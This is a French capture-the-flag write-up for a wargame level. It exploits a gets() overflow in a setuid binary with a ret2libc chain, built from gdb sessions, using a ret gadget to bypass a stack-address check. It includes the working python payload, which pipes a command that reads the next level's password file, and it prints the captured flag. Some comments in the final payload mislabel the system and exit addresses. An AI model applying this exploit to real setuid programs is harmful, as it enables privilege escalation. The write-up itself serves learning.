Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
/home/user/level2
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level2 :

```
$ ./level2
(waiting for input)
$ ./level2
da
da
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=4128e95e-4279-47df-81a9-a69c5f209d01) et en extrait une version probable du code :

```c
void p()
{
    fflush(stdout);

    int buffer[16];
    gets(buffer);

    int check = buffer[20];
    if ((check & 0xb0000000) == 0xb0000000)
    {
        printf("(%p)\n", check);
        exit(1);
    }

    puts(buffer);
    strdup(buffer);
}

int main()
{
    p();
}
```

J'identifie :

- une vulnérabilité possible avec `gets()`
- la mise en place d'un 'safeguard' avec une condition if

Tout comme le précédent niveau, il s'agirait la de ré-écrire l'adresse de retour avec un exploit type `Ret2Libc`. Ici, le code ne lance pas shell, donc à l'inverse du précédent niveau, je vais devoir utiliser la véritable `Ret2Libc`, qui consiste à aller chercher l'adresse de `system()`, (éventuellement d'`exit()` pour que le programme termine correctement) et celle de `/bin/sh` dans la `libc`.

L'exécution sera la même que pour `level1`, mais il faudra écrire ces 3 adresses dans le payload.

Pour trouver les trois adresses, ainsi que la taille de la stack, j'utilise `gdb` :

```h
$ gdb ./level2 -q
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.

(gdb) disas p
Dump of assembler code for function p:
    ...
   0x08048532 <+94>:    lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave <---------------------- break ici
   0x0804853e <+106>:   ret
End of assembler dump.

(gdb) b *p+105
Breakpoint 1 at 0x804853d

(gdb) r
Starting program: /home/user/level2/level2
dab
dab

Breakpoint 1, 0x0804853d in p ()

(gdb) info registers
...
esp            0xbffff6a0       0xbffff6a0
ebp            0xbffff708       0xbffff708
...

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

(gdb) info proc mappings
process 9921
Mapped address spaces:

    Start Addr   End Addr       Size     Offset objfile
    0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
    0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
    0x804a000  0x806b000    0x21000        0x0 [heap]
    0xb7e2b000 0xb7e2c000     0x1000        0x0
    0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so <--- libc
    0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so <--- end
    0xb7fd2000 0xb7fd5000     0x3000        0x0
    0xb7fd9000 0xb7fdd000     0x4000        0x0
    0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
    0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
    0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
    0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
    0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000, 0xb7fd2000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

Je peux commencer par calculer la taille de la stack comme au level précédent :

`0xbffff728 - 0xbffff6c0 = 0x68 = 104` bytes

Puis, soustraire par rapport à la position du buffer dans la stack (ici `0x4c(%ebp)`) soit

`0x68 - 0x4c = 0x1C = 28` bytes, soit : `104 - 28 = 76` bytes afin d'atteindre `ebp`.

J'ajoute 4 bytes pour écrire sur la `return address` de `main()`, soit 80 bytes.
Mon payload échouerait si je le construisais de la même manière qu'au `level1` car la première adresse après l'overflow est utilisé par ce bout de code :

```c
    int check = buffer[20];
    if ((check & 0xb0000000) == 0xb0000000)
    {
        printf("(%p)\n", check);
        exit(1);
    }
```

Afin de s'assurer qu'elle ne commence pas par le bit `0xb` (au travers d'une opération `AND`), or, mon payload ressemblerait à :

```h
"\x90" * 80 + "\xb7\xe6\xb0\x60" + "\xb7\xe6\xb0\x60" + "\xb7\xf8\xcc\x58"
^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^
buffer        adresse de system()  adresse d'exit()     adresse de "/bin/sh"
```

Ce qui serait problématique puisque la première adresse, qui est la nouvelle adresse de retour, commence par le bit `0xb`.

Je dois donc ajouter une étape supplémentaire dans le payload afin que le payload ne se fasse pas "attraper" par cette condition.

Une possibilité serait par exemple d'utiliser l'adresse d'un appel `ret`, par exemple celui de `p()`, puisqu'il cherchera ensuite la `return address`, qui sera la valeur suivante sur la stack, qui sera donc la suite du payload (et donc mon appel vers `system()`).

Notez que l'adresse de `/bin/sh` est mise en dernière dans le payload car c'est la manière dont les arguments de fonctions sont placées dans la stack (tout en haut de celle-ci).

Je cherche donc l'adresse de l'instruction de retour de `p()` :

```h
(gdb) disas p
Dump of assembler code for function p:
    ...
   0x08048535 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret <------------------------ ici
```

Et je l'ajoute donc à mon payload, que je construit tel quel :

```python
"\x90" * 80
+ "\x08\x04\x85\x3e" <- return address of p, [::-1] is an inverted splice
+ "\xb7\xe6\xb0\x60" <- return address of system
+ "\x08\x04\x83\xd0" <- return address of exit
+ "\xb7\xf8\xcc\x58" <- return address of "bin/sh"
```

Et tente de l'utiliser sur le binaire :

```bash
$ (python -c 'print("\x90" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\x08\x04\x83\xd0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])' && echo 'cat /home/user/level3/.pass') | ./level2
����������������������������������������������������������������>������������>`��X���
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Je construis mon payload en utilisant python, y ajoute une lecture du `.pass` du level3, et enfin le passe à l'executable `level2` :

```python
(python -c 'print("\x90"*80
+ "\x08\x04\x85\x3e"[::-1] # <- return address of p [::-1] is an inverted splice
+ "\xb7\xe6\xb0\x60"[::-1] # <- return address of exit
+ "\x08\x04\x83\xd0"[::-1] # <- return address of system
+ "\xb7\xf8\xcc\x58"[::-1] # <- return address of "bin/sh"
)' && echo 'cat /home/user/level3/.pass') | ./level2

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

